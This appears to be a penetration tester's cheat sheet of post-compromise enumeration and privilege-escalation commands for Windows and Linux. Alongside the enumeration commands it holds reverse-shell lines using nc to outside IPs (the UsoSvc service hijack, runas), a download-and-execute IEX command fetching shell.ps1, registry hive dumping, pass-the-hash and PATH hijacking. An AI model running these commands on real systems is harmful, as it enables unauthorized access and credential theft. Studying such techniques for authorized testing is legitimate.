>[!summary]
>After compromising a target and gaining the initial foothold as an unprivileged user, our first step is to gather as much information about our target as possible. This allows us to get a better understanding of the nature of the compromised machine and discover possible avenues for privilege escalation.

---

# Windows

## Enumerate Hostname

```powershell
C:\Users\student>hostname
client251
```

## Enumerate OS Version & Architecture

```powershell
# What is the OS and architecture? Is it missing any patches?
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr ReleaseId
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ReleaseId

wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture

# Enumerate Security Patch
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

- Any Kernel Exploit? Check using both Sherlock, Watson and windows-exploit-suggester
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Enumerate Unmounted Disks/Drives

```powershell
# Are there any other connected drives?
net use
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
mountvol
```

## Enumerate Users

```powershell
# Who are you?
whoami
echo %username%

# Any interesting user privileges? 
# Note: The State column does not mean that the user does or does not have access to this privilege. 
# If the privilege is listed, then that user has it.
whoami /priv
net user <user>

# What users are on the system? Any old user profiles that weren’t cleaned up?
net user
dir /b /ad "C:\Users\"
dir /b /ad "C:\Documents and Settings\" # Windows XP and below
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

# Is anyone else logged in?
qwinsta
```

- [SeImpersonatePrivilege](SeImpersonatePrivilege.md) exploitation (JP.exe doesn't work on Windows Server 2019 and Windows 10 1809 + ... Try RoguePotato or PrintSpoofer!)
- [SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) exploitation
- Token Impersonation --> RottenPotato
- Check if you have [any of these tokens enabled](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation): **SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege**?
- [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

## Enumerate Groups

```powershell
# In which groups am I?
whoami /groups

# What groups are on the system?
net localgroup
Get-LocalGroup | ft Name

# Are any of the users in the Administrators group?
net localgroup Administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

## Enumerate Installed Applications

```powershell
# What software is installed?
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

# Enumerate application
wmic product get name, version, vendor
```

## Enumerate Running Processes and Services

```powershell
# What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it? See Port Forwarding in Appendix.
tasklist /svc
tasklist /v
tasklist /v /fi "username eq system"
net start
wmic service list brief
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
sc queryex type= service
sc query		# Query the current status of a service

# Powershell
Get-WmiObject win32_service | Select-Object Name, State, StartName, PathName | Where-Object {$_.State -like 'Running'}
Get-WmiObject win32_service | Format-Table name, startname, startmode
# This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
Get-Process
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Get-Service
```

## Enumerate Unquoted paths [^2]

[^2]: [Unquoted Service Paths](Unquoted%20Service%20Paths.md)

```powershell
# Are there any unquoted service paths?
wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\\\" |findstr /i /v """
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\\Windows\\\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

## $PATH Interception

```powershell
# PATH contains a writeable folder with low privileges? The writeable folder is _before_ the folder that contains the legitimate binary?
//(Powershell) List contents of the PATH environment variable
//EXAMPLE OUTPUT: C:\Program Files\nodejs\;C:\WINDOWS\system32
$env:Path

//See permissions of the target folder
//EXAMPLE OUTPUT: BUILTIN\Users: GR,GW
icacls.exe "C:\Program Files\nodejs\"

//Place our evil-file in that folder.
copy evil-file.exe "C:\Program Files\nodejs\cmd.exe"

Because (in this example) "C:\Program Files\nodejs" is before "C:\WINDOWS\system32" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.
```

## Enumerate Services Permissions

| Mask | Permissions |
| --- | --- |
| F | Full access |
| M | Modify access |
| RX | Read and Execute |
| R | Read-only |
| W | Write-only |

```powershell
# Single service permissions
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
wmic service where caption="Serviio" get name, caption, state
sc qc <service name>				# query the configuration of a service
accesschk.exe -ucqv <Service_Name> 	# Check service rights

# Find PATH directories with weak permissions
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

# Any weak service permissions? Can we reconfigure anything? Again, upload accesschk.
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula

# Show service properties
accesschk.exe -ucqv <service> /accepteula

# Interact with a service
sc stop <service>
sc config <service> binpath="C:\Path\to\binary.exe"
sc start <service>

net start <service>
net stop <service>

# Example with Windows 10 - CVE-2019-1322 UsoSvc
PS C:\Windows\system32> sc.exe stop UsoSvc
PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
PS C:\Windows\system32> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

PS C:\Windows\system32> sc.exe start UsoSvc
```

## Enuemrate Registry permissions

```powershell
accesschk.exe /accepteula -uvwqk <reg>
reg query <reg>
reg add

# Powershell
Get-Acl <reg> | Format-List

# If we can modify the registry, we can make the service points to our custom binary
reg add <reg> /v <reg_name> /t <reg_type> /d <binary_directory> /f
```

## Enumerate Directories Permissions

```powershell
# Are there any weak folder or file permissions?
# Full Permissions for Everyone or Users on Program Folders?
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 

# Modify Permissions for Everyone or Users on Program Folders?
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# Writeable folders and files?
accesschk.exe -quws "Everyone" "C:\Program Files"
accesschk.exe -qwsu "Everyone" *
accesschk.exe -qwsu "Authenticated Users" *
accesschk.exe -qwsu "Users" *
```

## Enumerate Scheduled Tasks

```powershell
# What scheduled tasks are there? Anything custom implemented?
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v
dir C:\windows\tasks

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## What is ran at startup?

```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"

# If write access if provided to StartUp folder, use a vbs script to create a malicious shortcut and execute a custom binary
```

## Enumerate AlwaysInstallElevated and binaries that AutoElevate

```powershell
# Is AlwaysInstallElevated enabled? I have not ran across this but it doesn’t hurt to check.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
	HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
	AlwaysInstallElevated REG_DWORD 0x1
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
	AlwaysInstallElevated REG_DWORD 0x1

# If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.
# msfvenom <payload> <lhost> <lport> -f msi -o exploit.msi
msiexec /quit /qn /i exploit.msi
```

## Enumerate Networking Information

```powershell
ipconfig /all                      	# Show all interfaces

# What routes do we have?
route print                        	# Show all routing tables

# Are there connections to other hosts?
netstat -ano                    	# Show every active network connections
netstat -abno    					# Show every active network connections and the exe file      

# What in the ARP cache?
arp -a

# Anything in the hosts file?
C:\WINDOWS\System32\drivers\etc\hosts
```

## Enumerate Firewall Status and Rules

```powershell
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
```

## Enumerate Antivirus

```powershell
sc query windefend
wmic service list brief
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
sc queryex type= service
```

## Enumerate Device Drivers and Kernel Modules

```powershell
PS C:\Users\student> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path  # List of drivers
Display Name Start Mode Path
------------ ---------- ----
1394 OHCI Compliant Host Controller Manual C:\Windows\system32\drivers\1394ohci.s
3ware Manual C:\Windows\system32\drivers\3ware.sys
Microsoft ACPI Driver Boot C:\Windows\system32\drivers\ACPI.sys
ACPI Devices driver Manual C:\Windows\system32\drivers\AcpiDev.sy
Microsoft ACPIEx Driver Boot C:\Windows\system32\Drivers\acpiex.sys
...

PS C:\Users\student> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}  # Version number
DeviceName DriverVersion Manufacturer
---------- ------------- ------------
VMware VMCI Host Device 9.8.6.0 VMware, Inc.
VMware PVSCSI Controller 1.3.10.0 VMware, Inc.
VMware SVGA 3D 8.16.1.24 VMware, Inc.
VMware VMCI Bus Device 9.8.6.0 VMware, Inc.
VMware Pointing Device 12.5.7.0 VMware, Inc.
```

## Windows Subsystem for Linux (WSL)

>[!tip]
>With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse.

```bash
where wsl.exe
where bash.exe

wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Alternatively you can explore the WSL filesystem in the folder: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credentials

>[!tip]
>See also [Dumping Passwords and Credentials](Dumping%20Passwords%20and%20Credentials.md)

```powershell
wce32.exe -w
wce64.exe -w
fgdump.exe

# Can we access SAM and SYSTEM files?
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Anything interesting in Credential Manager?
cmdkey /list
# If credentials pops out they can be reused through RunAs ...
runas /savecred /user:WORKGROUP\\Administrator "\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe"
runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
# ... net use ...
net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
x:
# ... or powershell non interactive RunAs ...
PS C:\inetpub\wwwroot\internal-01\log> $username = "BART\Administrator"
PS C:\inetpub\wwwroot\internal-01\log> $password = "3130438f31186fbaf962f407711faddb"
PS C:\inetpub\wwwroot\internal-01\log> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost

dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\

Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\

# Any passwords in the registry?
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKEY_CURRENT_USER\Software\TightVNC\Server"
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials

# Files containing password
findstr /si password *.xml *.ini *.txt *.config 2>nul
findstr /si password *.inidir /s *pass* == *cred* == *vnc* == *.config*
Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"

# Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?
dir /s *pass* == *vnc* == *.config* 2>nul
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Path C:\Users -Filter *password*,*vnc*,*.config,*.txt* -Recurse

# Are there sysprep or unattend files available that weren’t cleaned up?
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Are there any Group Policy Preferences files whoese passwords can be easily cracked?
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

## LAPS enumeration

>[!info]
>The "Local Administrator Password Solution" (LAPS [^1]) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

[^1]: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps

```bash
# Identify if installed by Program Files on Domain Controller
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'

# Identify if installed by checking the AD Object
Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'

# Powerview
Get-NetComputer | Select-Object 'name','ms-mcs-admpwd'
Get-DomainComputer -identity <Hostname> -properties ms-Mcs-AdmPwd

# PowerShell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

# Native
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}

# Import module
Import-Module AdmPwd.PS

# Find the OUs that can read LAPS passwords
Find-AdmPwdExtendedRights -Identity <OU>

# Once we have compromised a user that can read LAPS
Get-AdmPwdPassword -ComputerName <Hostname>

# Metasploit
use post/windows/gather/credentials/enum_laps

# LAPSToolkit
Resource: https://github.com/leoloobeek/LAPSToolkit
```

## Interesting Files and Sensitive Information

```powershell
# Powershell history
Get-PSReadlineOption
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# If the server is an IIS webserver, what’s in inetpub? Any hidden directories? web.config files?
dir /a C:\inetpub\
dir /s web.config
C:\Windows\System32\inetsrv\config\applicationHost.config

Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

# What’s in the IIS Logs?
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log

# Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue

# Any Apache web logs?
dir /s access.log error.log
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue

# Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?
dir /s *pass* == *vnc* == *.config* 2>nul
Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Path C:\Users -Filter *password*,*vnc*,*.config,*.txt* -Recurse

# Emails
C:\users\(your user name)\AppData\Local\Microsoft\Windows Mail\Local Folders
C:\Users\AppData\Local\Packages\LocalState\Indexed\LiveComm

findstr /si password *.dbx
dir *.dbx /s
Get-Childitem -Path C:\Users -Filter *.dbx -Recurse
Get-Childitem -Path C:\Users -Include *.dbx -Recurse -File -ErrorAction SilentlyContinue
```

## Spawn a shell using compromised credentials

```powershell
# If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 # Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
winexe -U active.htb/SVC_TGS%'GPPstillStandingStrong2k18' //10.10.10.100 cmd.exe
```

From local administrator to NT SYSTEM

```powershell
PsExec.exe -i -s cmd.exe
```

## Logs

```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini 
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

---

# Linux

## Enumerate Users

```bash
# Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
student@debian:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)

who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
```

## Enumerate Hostnames

```bash
student@debian:~$ hostname
debian

root@mailman:~# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       mailman.local   mailman

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Enumerate OS Version & Architecture

```bash
# What's the distribution type? What version?

student@debian:~$ cat /etc/issue
Debian GNU/Linux 9 \n \l

student@debian:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
...

# What's the kernel version? Is it 64-bit?
student@debian:~$ uname -a
Linux debian 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686 GNU/Linux
cat /proc/version

uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

## Enumerate the environment

```bash
# What can be learnt from the environmental variables?
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

## Enumerate Running Processes and Services

```bash
# What services are running? Which service has which user privilege?
ps -aux
ps -ef
top
cat /etc/services
systemctl list-units --type=service

# Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
ps aux | grep root
ps -ef | grep root

# Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

## Enumerate Networking Information

```bash
# What NIC(s) does the system have? Is it connected to another network?
ip a
ifconfig
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

/sbin/route
/sbin/routel

# What other users & hosts are communicating with the system?
ss					# See all connection
ss -tulpn			# Show all listing tcp sockets including the corresponding process (port number)
ss -tlp 			# Show all listing tcp sockets including the corresponding process (port alias)

ss -polentau
ss -anp

netstat -polentau
netstat -tulpn
netstat -antpx
netstat -antup

lsof -i
lsof -i :80

grep 80 /etc/services
chkconfig --list
chkconfig --list | grep 3:on
last
w

# DNS
cat resolv.conf
```

## Enumerate Firewall Status and Rules

```bash
iptables, /etc/iptables, iptables-save files
```

## Enumerate Scheduled Tasks

```bash
# What jobs are scheduled?
ls -lah /etc/cron*
cat /etc/crontab
grep "CRON" /var/log/cron.log

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

## Enumerate Installed Applications and Patch Levels

```bash
# What applications are installed? What version are they? Are they currently running?
dpkg -l
ls -alh /usr/bin/
ls -alh /sbin/
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
rpm -qa
```

## Enumerate Readable/Writable Files and Directories

```bash
# Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
find / -writable -type d 2>/dev/null      # writeable folders for current user
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o=w -type d 2>/dev/null     # world-writeable folders
find / -perm -o=x -type d 2>/dev/null     # world-executable folders
